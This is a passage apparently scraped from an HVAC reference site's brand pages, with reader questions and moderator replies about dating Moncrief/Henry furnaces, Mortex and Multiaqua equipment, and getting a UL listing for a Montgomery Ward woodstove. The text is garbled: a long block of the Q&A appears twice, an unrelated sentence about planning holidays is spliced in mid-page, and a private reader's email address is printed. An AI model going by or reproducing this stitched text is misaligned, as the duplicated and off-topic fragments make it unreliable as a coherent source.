There is no serial #. It is maroon with chrome trim - Matt Falk Aire Serv - 3/29/2013</p><h4>Reply: Henry Furnaces &amp; the Moncrief furnace name</h4><p>Matt,<br> The Henry Furnace Company who made Monrief furnaces was a Medina Ohio company. IF data tags were legible you'd find a 3-digit series number (perhaps like 622) equivalent to a model, or an actual Model Number (L150) and a serial number sometimes in the format A-620-22-4-B.<br> With no data we can't know the age of yours, though sometimes there will be a clue of the 'at least' age by noting data on the equipment service tag or on a date written on the original instructions stuffed up in the framing overhead.<br> Without any information you can stil bet the Moncrief is more than 20 years old, more likely from the 1950's. The 'safe' advice is to declare a 50-year old heating furnace obsolete, and past due for replacement. A more thorough assessment by someone wanting to put off buying a new furnace would be a thorough cleaning, inspection for damage or heat exchanger leaks, tune-up, and efficiency measurement if the system was found safe and operable.</p><p>Be sure that any efficiency assessment is done after cleaning and tuning and a safety inspection.</p><p>See <span>MONCRIEF furnaces </span> that may be helpful. That catalogs 1950's era Moncrief heating equipment. </p><p>See HENRY FURNACES &amp; Moncrief furnaces for historical details and the chain of owners and marketers of both Henry furnaces and Moncrief furnaces. </p><h3>Question:</h3><p>(Oct 19, 2019) Chris said:</p><p> I have a moncrief furnace model 36c84 can you tell me how old it is n what its worth </p><h4>Reply:</h4><p>Chris</p><p>You will need the serial number for your heater to decode is age. The brand and model number are the starting point but they're not enough.</p><p>Above on this page you will see a link to Manuel's arranged alphabetically and there you would pick the clink that includes the letter M and there you could find your furnace brand.</p><p>I've done that for you and you could leap directly to this link</p><p><span>MONCRIEF furnaces</span></p><p> There you will see that more information is provided also linking to the heater equipment company name HENRY FURNACES</p><p> If you'll be kind enough to attach a photo of the data tag for your furnace I'll be glad to look at it directly myself. </p><h2>Mortex Electric Furnaces</h2><ul><li>MORTEX ELECTRIC FURNACE INSTALLATION MANUAL Models WEFC WEFX Series [PDF] (2009) Winchester by Mortex Products, Inc.</li><li>Mortex Products, Inc., Fort Worth TX 76106 Website: http://mortx.com/ Tel: 1-800-444-6354 produces heating and air conditioning and refrigeratin products.</li></ul><h2>Montgomery Ward<br></h2><p>On 2014-11-06 by Mark Cassiday - Montgomery Ward Franklin Woodstove</p><p>I purchased a used montgomery ward franklin wood burning stove. I would like to install it in my family room. The problem is, my township inspector said it had to have a U.L. tag on it to be approved or I could not install it. How do I obtain one for this model (VMT-2105 R)? I have E-mailed U.L. and also called them to no avail. Any help would be greatly appreciated.My E-mail address is markcass@newpaths.org.<br></p><p>On 2014-11-06 by (mod) - </p><p>Mark, <br> Regrettably, if the particular wood burner that you purchased is NOT UL-listed, you would not find it practical and probably not even feasible to 'obtain a UL Listing' - since doing so requires submitting a product (or perhaps several of them) to an appropriate Underwriters Laboratory for testing and certification or 'listing'. <br> If the model originally had a UL Listing it should have a metal tag on the device indicating that status. <br> Now that I've arm-waved and speculated about all the bad news, here's what you want to do: <br> Go to the Underwriters Laboratories website database <br> http://database.ul.com <br> and search for your woodstove by manufacturer and model. UL will tell you if that product ever was listed. <br> If it was, you could print that information and give it to your astute building inspector. <br> I tried a search of the UL database for 'Wards' + 'VMT-2105 R' and got no hits. You might try some other variations. <br> Daniel</p><p>Since it can help them to accordingly plan their valuable holidays and can make the holidays memorable.

There is no serial #. It is maroon with chrome trim - Matt Falk Aire Serv - 3/29/2013</p><h4>Reply: Henry Furnaces &amp; the Moncrief furnace name</h4><p>Matt,<br> The Henry Furnace Company who made Monrief furnaces was a Medina Ohio company. IF data tags were legible you'd find a 3-digit series number (perhaps like 622) equivalent to a model, or an actual Model Number (L150) and a serial number sometimes in the format A-620-22-4-B.<br> With no data we can't know the age of yours, though sometimes there will be a clue of the 'at least' age by noting data on the equipment service tag or on a date written on the original instructions stuffed up in the framing overhead.<br> Without any information you can stil bet the Moncrief is more than 20 years old, more likely from the 1950's. The 'safe' advice is to declare a 50-year old heating furnace obsolete, and past due for replacement. A more thorough assessment by someone wanting to put off buying a new furnace would be a thorough cleaning, inspection for damage or heat exchanger leaks, tune-up, and efficiency measurement if the system was found safe and operable.</p><p>Be sure that any efficiency assessment is done after cleaning and tuning and a safety inspection.</p><p>See <span>MONCRIEF furnaces </span> that may be helpful. That catalogs 1950's era Moncrief heating equipment. </p><p>See HENRY FURNACES &amp; Moncrief furnaces for historical details and the chain of owners and marketers of both Henry furnaces and Moncrief furnaces. </p><h3>Question:</h3><p>(Oct 19, 2019) Chris said:</p><p> I have a moncrief furnace model 36c84 can you tell me how old it is n what its worth </p><h4>Reply:</h4><p>Chris</p><p>You will need the serial number for your heater to decode is age. The brand and model number are the starting point but they're not enough.</p><p>Above on this page you will see a link to Manuel's arranged alphabetically and there you would pick the clink that includes the letter M and there you could find your furnace brand.</p><p>I've done that for you and you could leap directly to this link</p><p><span>MONCRIEF furnaces</span></p><p> There you will see that more information is provided also linking to the heater equipment company name HENRY FURNACES</p><p> If you'll be kind enough to attach a photo of the data tag for your furnace I'll be glad to look at it directly myself. </p><h2>Mortex Electric Furnaces</h2><ul><li>MORTEX ELECTRIC FURNACE INSTALLATION MANUAL Models WEFC WEFX Series [PDF] (2009) Winchester by Mortex Products, Inc.</li><li>Mortex Products, Inc., Fort Worth TX 76106 Website: http://mortx.com/ Tel: 1-800-444-6354 produces heating and air conditioning and refrigeratin products.</li></ul><h2>Montgomery Ward<br></h2><p>On 2014-11-06 by Mark Cassiday - Montgomery Ward Franklin Woodstove</p><p>I purchased a used montgomery ward franklin wood burning stove. I would like to install it in my family room. The problem is, my township inspector said it had to have a U.L. tag on it to be approved or I could not install it. How do I obtain one for this model (VMT-2105 R)? I have E-mailed U.L. and also called them to no avail. Any help would be greatly appreciated.My E-mail address is markcass@newpaths.org.<br></p><p>On 2014-11-06 by (mod) - </p><p>Mark, <br> Regrettably, if the particular wood burner that you purchased is NOT UL-listed, you would not find it practical and probably not even feasible to 'obtain a UL Listing' - since doing so requires submitting a product (or perhaps several of them) to an appropriate Underwriters Laboratory for testing and certification or 'listing'. <br> If the model originally had a UL Listing it should have a metal tag on the device indicating that status. <br> Now that I've arm-waved and speculated about all the bad news, here's what you want to do: <br> Go to the Underwriters Laboratories website database <br> http://database.ul.com <br> and search for your woodstove by manufacturer and model. UL will tell you if that product ever was listed. <br> If it was, you could print that information and give it to your astute building inspector. <br> I tried a search of the UL database for 'Wards' + 'VMT-2105 R' and got no hits. You might try some other variations. <br> Daniel</p><h2><span>MULTIAQUA A/C, Chillers, Fan Coil Units</span></h2><p>Multiaqua produces air conditioning systems based on chillers and water fan coil units. </p><ul><li>Contact: Multiaqua, Inc. 306 Hagood Street, Easley South Carolina 29640 Phone: (864) 850-8990 Fax: (864) 850-8995 Email: Eastcoastsales@Multiaqua.com Westcoastsales@Multiaqua.com Internationalsales@multiaqua.com</li><li>Multiaqua CEILING CASSETTE FAN COIL UNIT Operation and Installation Manual MHCFC4W-04, 08, 12, 16 [PDF]</li></ul><div class='lYI'><iframe width='auto' height='auto' src='https://www.youtube.com/embed/LHoRFHcoS2A' frameborder='0' allowfullscreen=""></iframe></div><h4>Munchkin Boilers, Manuals, Information, Status</h4><p>Munchkin gas fired 'hot water' boilers information now found at MUNCHKIN BOILER MANUALS</p><h2>National U.S. Radiator Corporation HVAC</h2><p>National U.S. Radiator HVAC, also doing business as Capitolaire, was acquired by Crane Industries in 1960.
